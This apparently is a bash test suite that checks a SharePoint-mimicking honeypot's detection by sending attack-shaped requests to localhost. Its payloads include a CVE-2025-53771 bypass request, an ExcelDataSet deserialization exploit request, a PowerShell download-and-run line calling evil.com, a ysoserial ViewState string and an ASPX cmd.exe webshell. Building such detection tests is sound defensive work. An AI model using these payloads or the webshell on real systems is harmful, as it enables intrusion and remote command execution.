#!/bin/bash

# ToolShell Honeypot v2.0 - Comprehensive Test Suite
# Tests the complete Sensor + Analyzer architecture with advanced detection capabilities

# Note: Removed 'set -e' to prevent premature exit on non-critical errors

# Configuration
HONEYPOT_URL="https://localhost:443"
DASHBOARD_URL="http://localhost:8501"
CURL_OPTS="-k -s -w @curl-format.txt"
TEST_RESULTS_DIR="./test_results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Test counters
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

# Create curl format file for timing measurements
cat > curl-format.txt << 'EOF'
{
  "time_total": %{time_total},
  "time_connect": %{time_connect},
  "time_starttransfer": %{time_starttransfer},
  "http_code": %{http_code},
  "size_download": %{size_download}
}
EOF

# Create test results directory
mkdir -p "$TEST_RESULTS_DIR"

print_header() {
    echo -e "\n${CYAN}================================================================================================${NC}"
    echo -e "${CYAN}$1${NC}"
    echo -e "${CYAN}================================================================================================${NC}\n"
}

print_section() {
    echo -e "\n${BLUE}>>> $1${NC}\n"
}

print_test() {
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    echo -e "${YELLOW}[TEST $TOTAL_TESTS] $1${NC}"
}

print_success() {
    echo -e "${GREEN}✓ $1${NC}"
    PASSED_TESTS=$((PASSED_TESTS + 1))
}

print_error() {
    echo -e "${RED}✗ $1${NC}"
    FAILED_TESTS=$((FAILED_TESTS + 1))
}

print_info() {
    echo -e "${PURPLE}ℹ $1${NC}"
}

check_services() {
    print_section "Service Health Check"
    
    print_test "Checking Docker services"
    if sudo docker-compose ps | grep -q "Up"; then
        print_success "Docker services are running"
    else
        print_error "Docker services not running. Please start with: ./manage.sh"
        exit 1
    fi
    
    print_test "Testing honeypot sensor connectivity"
    local honeypot_response=$(curl -k -s --connect-timeout 10 --max-time 15 -w "%{http_code}" "$HONEYPOT_URL" -o /dev/null 2>/dev/null)
    if [ "$honeypot_response" = "200" ]; then
        print_success "Honeypot sensor is responding (HTTP 200)"
    else
        print_error "Honeypot sensor not accessible at $HONEYPOT_URL (HTTP: $honeypot_response)"
        print_info "Continuing with tests anyway..."
    fi
    
    print_test "Testing dashboard connectivity"
    local dashboard_response=$(curl -s --connect-timeout 10 --max-time 15 -w "%{http_code}" "$DASHBOARD_URL" -o /dev/null 2>/dev/null)
    if [ "$dashboard_response" = "200" ]; then
        print_success "Dashboard is accessible (HTTP 200)"
    else
        print_error "Dashboard not accessible at $DASHBOARD_URL (HTTP: $dashboard_response)"
        print_info "Continuing with tests anyway..."
    fi

}

test_performance() {
    print_section "Performance Tests - Response Time Validation"
    
    print_test "Testing sensor response time (target: <100ms)"
    
    local response_times=()
    for i in {1..5}; do
        local result=$(curl $CURL_OPTS "$HONEYPOT_URL/" -o /dev/null 2>&1)
        local time_total=$(echo "$result" | grep -o '"time_total": [0-9.]*' | cut -d' ' -f2)
        response_times+=($time_total)
        echo "  Attempt $i: ${time_total}s"
    done
    
    # Calculate average
    local sum=0
    for time in "${response_times[@]}"; do
        sum=$(echo "$sum + $time" | bc -l)
    done
    local avg=$(echo "scale=3; $sum / ${#response_times[@]}" | bc -l)
    
    echo "  Average response time: ${avg}s"
    
    if (( $(echo "$avg < 0.1" | bc -l) )); then
        print_success "Response time within target (<100ms)"
    else
        print_error "Response time exceeds target (${avg}s >= 100ms)"
    fi
}

test_basic_endpoints() {
    print_section "Basic Endpoint Tests - IOC Tag Generation"
    
    # Test specific IOC-generating endpoints
    local endpoints=(
        "/_layouts/15/ToolPane.aspx:IOC:ENDPOINT_TOOLPANE"
        "/_layouts/16/ToolPane.aspx:IOC:ENDPOINT_TOOLPANE"
        "/_layouts/15/ToolPane.aspx/:IOC:CVE_2025_53771"
        "/_layouts/SignOut.aspx:IOC:ENDPOINT_SIGNOUT"
        "/_controltemplates/15/AclEditor.ascx:IOC:ENDPOINT_ACLEDITOR"
        "/_layouts/15/spinstall0.aspx:IOC:WEBSHELL_PROBE"
        "/favicon.ico:IOC:ENDPOINT_FAVICON"
    )
    
    for endpoint_test in "${endpoints[@]}"; do
        IFS=':' read -ra PARTS <<< "$endpoint_test"
        local endpoint="${PARTS[0]}"
        local expected_tag="${PARTS[1]}:${PARTS[2]}"
        
        print_test "Testing endpoint: $endpoint (expecting: $expected_tag)"
        
        local response=$(curl $CURL_OPTS "$HONEYPOT_URL$endpoint" 2>&1)
        local http_code=$(echo "$response" | grep -o '"http_code": [0-9]*' | cut -d' ' -f2)
        
        if [ "$http_code" = "200" ]; then
            print_success "Endpoint responded with HTTP 200"
        else
            print_error "Endpoint returned HTTP $http_code"
        fi
    done
}

test_heuristic_detection() {
    print_section "Heuristic Detection Tests"
    
    print_test "Testing large payload detection (HEURISTIC:LARGE_PAYLOAD)"
    local large_payload=$(python3 -c "print('A' * 2048)")  # 2KB payload
    curl $CURL_OPTS -X POST -d "$large_payload" "$HONEYPOT_URL/test" > /dev/null 2>&1
    print_success "Large payload sent"
    
    print_test "Testing unusual HTTP method (HEURISTIC:UNUSUAL_METHOD)"
    curl $CURL_OPTS -X DELETE "$HONEYPOT_URL/test" > /dev/null 2>&1
    print_success "DELETE method sent"
    
    print_test "Testing long URL path (HEURISTIC:LONG_PATH)"
    local long_path=$(python3 -c "print('/' + 'A' * 250)")
    curl $CURL_OPTS "$HONEYPOT_URL$long_path" > /dev/null 2>&1
    print_success "Long path sent"
    
    print_test "Testing large Base64 content (HEURISTIC:LARGE_B64)"
    local b64_content=$(echo "This is a test payload for Base64 detection" | base64 | tr -d '\n')
    local large_b64=$(python3 -c "print('$b64_content' * 10)")  # Create large Base64
    curl $CURL_OPTS -X POST -d "data=$large_b64" "$HONEYPOT_URL/test" > /dev/null 2>&1
    print_success "Large Base64 content sent"
}

test_cve_2025_53771() {
    print_section "CVE-2025-53771 Trailing Slash Bypass Test"
    
    print_test "Testing CVE-2025-53771 bypass technique"
    
    # Simulate the bypass with trailing slash and proper parameters
    local response=$(curl $CURL_OPTS -X POST \
        -H "Referer: https://localhost/_layouts/SignOut.aspx" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "DisplayMode=Edit&a=/ToolPane.aspx&MSOTlPn_Uri=https://localhost/_controltemplates/15/AclEditor.ascx" \
        "$HONEYPOT_URL/_layouts/15/ToolPane.aspx/" 2>&1)
    
    local http_code=$(echo "$response" | grep -o '"http_code": [0-9]*' | cut -d' ' -f2)
    
    if [ "$http_code" = "200" ]; then
        print_success "CVE-2025-53771 test completed (HTTP 200)"
        print_info "Expected tags: IOC:ENDPOINT_TOOLPANE, IOC:CVE_2025_53771, IOC:PARAM_DISPLAYMODE_EDIT, IOC:REFERER_SIGNOUT"
    else
        print_error "CVE-2025-53771 test failed (HTTP $http_code)"
    fi
}

test_r7_metasploit_exploit() {
    print_section "R7 Metasploit Exploit Simulation"
    
    print_test "Generating R7-style payload"
    
    # Create a simulated .NET gadget payload
    local dotnet_gadget='<?xml version="1.0"?>
<root>
  <DataSet>
    <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
      <xs:element name="NewDataSet" msdata:IsDataSet="true">
        <xs:complexType>
          <xs:choice minOccurs="0" maxOccurs="unbounded">
            <xs:element name="Table1">
              <xs:complexType>
                <xs:sequence>
                  <xs:element name="Column1" type="xs:string" minOccurs="0"/>
                </xs:sequence>
              </xs:complexType>
            </xs:element>
          </xs:choice>
        </xs:complexType>
      </xs:element>
    </xs:schema>
    <diffgr:diffgram xmlns:diffgr="urn:schemas-microsoft-com:xml-diffgram-v1">
      <NewDataSet>
        <Table1 diffgr:id="Table11" msdata:rowOrder="0">
          <Column1>System.Diagnostics.Process.Start("calc.exe")</Column1>
        </Table1>
      </NewDataSet>
    </diffgr:diffgram>
  </DataSet>
</root>'
    
    # Gzip compress the payload
    local compressed_payload=$(echo "$dotnet_gadget" | gzip | base64 -w 0)
    
    print_info "Created compressed payload: ${#compressed_payload} bytes"
    
    # Construct the R7 exploit request
    local r7_xml="<%@ Register Tagprefix=\"ui\" Namespace=\"System.Web.UI\" Assembly=\"System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" %>
<%@ Register Tagprefix=\"scorecards\" Namespace=\"Microsoft.PerformancePoint.Scorecards\" Assembly=\"Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c\" %>
<ui:UpdateProgress>
  <ProgressTemplate>
    <scorecards:ExcelDataSet CompressedDataTable=\"$compressed_payload\" DataTable-CaseSensitive=\"true\" runat=\"server\"/>
  </ProgressTemplate>
</ui:UpdateProgress>"
    
    print_test "Sending R7 Metasploit exploit simulation"
    
    local response=$(curl $CURL_OPTS -X POST \
        -H "Referer: https://localhost/_layouts/SignOut.aspx" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "DisplayMode=Edit&a=/ToolPane.aspx&MSOTlPn_Uri=https://localhost/_controltemplates/15/AclEditor.ascx&MSOTlPn_DWP=$(echo "$r7_xml" | sed 's/$compressed_payload/'$compressed_payload'/g' | python3 -c 'import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))')" \
        "$HONEYPOT_URL/_layouts/15/ToolPane.aspx" 2>&1)
    
    local http_code=$(echo "$response" | grep -o '"http_code": [0-9]*' | cut -d' ' -f2)
    
    if [ "$http_code" = "200" ]; then
        print_success "R7 exploit simulation sent successfully"
        print_info "Expected tags: PATTERN:R7_PAYLOAD, IOC:ENDPOINT_TOOLPANE, IOC:PARAM_DISPLAYMODE_EDIT"
        print_info "Analyzer should decompress payload and detect .NET gadget"
    else
        print_error "R7 exploit simulation failed (HTTP $http_code)"
    fi
}

test_powershell_patterns() {
    print_section "PowerShell Pattern Detection Tests"
    
    local powershell_payloads=(
        "powershell -EncodedCommand $(echo 'Write-Host Test' | iconv -t utf-16le | base64 -w 0)"
        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"
        'powershell -c "I"+"EX"'
        "cmd.exe /c powershell -WindowStyle Hidden -Command Get-Process"
        "[System.Convert]::FromBase64String('VGVzdCBwYXlsb2Fk')"
    )
    
    for i in "${!powershell_payloads[@]}"; do
        print_test "Testing PowerShell pattern $((i+1)): ${powershell_payloads[i]:0:50}..."
        
        curl $CURL_OPTS -X POST \
            -d "cmd=${powershell_payloads[i]}" \
            "$HONEYPOT_URL/test" > /dev/null 2>&1
        
        print_success "PowerShell payload $((i+1)) sent"
    done
    
    print_info "Expected tag: PATTERN:POWERSHELL"
}

test_yara_detection() {
    print_section "YARA Detection Tests"
    
    print_test "Testing ViewState + ysoserial pattern"
    
    local viewstate_payload='__VIEWSTATE=dDwxNTI2NzQ5NzE0O3Q8O2w8aTwxPjs%2BO2w8dDw7bDxpPDEyPjtpPDE1Pjs%2BO2w8dDxwPHA8bDxUZXh0Oz47bDx5c29zZXJpYWw%3d&ysoserial_test=true'
    
    curl $CURL_OPTS -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "$viewstate_payload" \
        "$HONEYPOT_URL/_layouts/15/ToolPane.aspx" > /dev/null 2>&1
    
    print_success "ViewState + ysoserial payload sent"
    print_info "Expected tags: PATTERN:VIEWSTATE_EXPLOIT, PATTERN:YSOSERIAL"
    
    print_test "Testing ASPX webshell pattern"
    
    local aspx_webshell='<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<html>
<body>
<% 
    string cmd = Request.QueryString["cmd"];
    Process proc = new Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.Start();
%>
</body>
</html>'
    
    curl $CURL_OPTS -X POST \
        -d "webshell=$aspx_webshell" \
        "$HONEYPOT_URL/upload" > /dev/null 2>&1
    
    print_success "ASPX webshell pattern sent"
    print_info "Expected tag: PATTERN:ASPX_WEBSHELL"
}

test_analyzer_functionality() {
    print_section "Analyzer Deep Analysis Tests"
    
    print_test "Waiting for analyzer to process events (10 seconds)"
    sleep 10
    
    print_test "Checking for processed events"
    if [ -d "./data/events/processed" ] && [ "$(ls -A ./data/events/processed 2>/dev/null)" ]; then
        local processed_count=$(ls -1 ./data/events/processed/*.json 2>/dev/null | wc -l)
        print_success "Found $processed_count processed events"
        
        # Check for deep analysis results in a sample file
        local sample_file=$(ls ./data/events/processed/*.json 2>/dev/null | head -1)
        if [ -n "$sample_file" ] && grep -q "deep_analysis_results" "$sample_file"; then
            print_success "Deep analysis results found in processed events"
        else
            print_error "No deep analysis results found in processed events"
        fi
    else
        print_error "No processed events found - analyzer may not be working"
    fi
    
    print_test "Checking for raw body storage"
    if [ -d "./data/raw_bodies" ] && [ "$(ls -A ./data/raw_bodies 2>/dev/null)" ]; then
        local bodies_count=$(ls -1 ./data/raw_bodies/*.bin 2>/dev/null | wc -l)
        print_success "Found $bodies_count stored request bodies"
    else
        print_error "No raw bodies found in storage"
    fi
    
    print_test "Checking analyzer error handling"
    if [ -d "./data/events/error" ]; then
        local error_count=$(ls -1 ./data/events/error/*.json 2>/dev/null | wc -l)
        if [ "$error_count" -eq 0 ]; then
            print_success "No analysis errors detected"
        else
            print_error "Found $error_count analysis errors"
        fi
    fi
}

test_dashboard_integration() {
    print_section "Dashboard Integration Tests"
    
    print_test "Testing dashboard data loading"
    
    # Simple check that dashboard loads without errors
    local dashboard_response=$(curl -s --connect-timeout 10 "$DASHBOARD_URL" 2>/dev/null || echo "ERROR")
    
    if [ "$dashboard_response" != "ERROR" ] && echo "$dashboard_response" | grep -q "ToolShell Honeypot"; then
        print_success "Dashboard loads successfully"
    else
        print_error "Dashboard failed to load or return expected content"
    fi
    
    print_test "Checking dashboard displays event data"
    # Note: This is a basic connectivity test - full dashboard testing would require more complex automation
    print_info "Manual verification recommended: Check $DASHBOARD_URL for event data"
}

generate_test_report() {
    print_section "Test Report Generation"
    
    local report_file="$TEST_RESULTS_DIR/test_report_$TIMESTAMP.json"
    
    cat > "$report_file" << EOF
{
  "test_run": {
    "timestamp": "$TIMESTAMP",
    "total_tests": $TOTAL_TESTS,
    "passed_tests": $PASSED_TESTS,
    "failed_tests": $FAILED_TESTS,
    "success_rate": "$(echo "scale=2; $PASSED_TESTS * 100 / $TOTAL_TESTS" | bc -l)%"
  },
  "architecture": "v2.0 Sensor+Analyzer",
  "components_tested": [
    "Sensor Performance",
    "IOC Tag Generation", 
    "Heuristic Detection",
    "CVE-2025-53771 Bypass",
    "R7 Metasploit Exploit",
    "PowerShell Patterns",
    "YARA Detection",
    "Analyzer Processing",
    "Dashboard Integration"
  ],
  "notes": "Comprehensive test suite for ToolShell Honeypot v2.0 architecture"
}
EOF
    
    print_success "Test report generated: $report_file"
}

cleanup() {
    print_section "Cleanup"
    rm -f curl-format.txt
    print_success "Cleaned up temporary files"
}

main() {
    print_header "ToolShell Honeypot v2.0 - Comprehensive Test Suite"
    print_info "Testing Sensor + Analyzer architecture with advanced detection capabilities"
    print_info "Results will be saved to: $TEST_RESULTS_DIR"
    
    # Execute test phases
    check_services
    test_performance
    test_basic_endpoints  
    test_heuristic_detection
    test_cve_2025_53771
    test_r7_metasploit_exploit
    test_powershell_patterns
    test_yara_detection
    test_analyzer_functionality
    test_dashboard_integration
    
    # Generate final report
    generate_test_report
    cleanup
    
    # Print final summary
    print_header "Test Suite Complete"
    echo -e "${GREEN}✓ Passed: $PASSED_TESTS${NC}"
    echo -e "${RED}✗ Failed: $FAILED_TESTS${NC}"
    echo -e "${BLUE}📊 Total: $TOTAL_TESTS${NC}"
    
    local success_rate=$(echo "scale=1; $PASSED_TESTS * 100 / $TOTAL_TESTS" | bc -l)
    echo -e "${PURPLE}🎯 Success Rate: $success_rate%${NC}"
    
    if [ "$FAILED_TESTS" -eq 0 ]; then
        echo -e "\n${GREEN}🎉 All tests passed! ToolShell Honeypot v2.0 is working correctly.${NC}"
        echo -e "${CYAN}👀 Check the dashboard at $DASHBOARD_URL to view captured events and analysis results.${NC}"
        exit 0
    else
        echo -e "\n${YELLOW}⚠️  Some tests failed. Please review the output above and check service logs.${NC}"
        exit 1
    fi
}

# Check dependencies
command -v bc >/dev/null 2>&1 || { echo -e "${RED}Error: bc is required but not installed.${NC}" >&2; exit 1; }

# Run main function
main "$@" 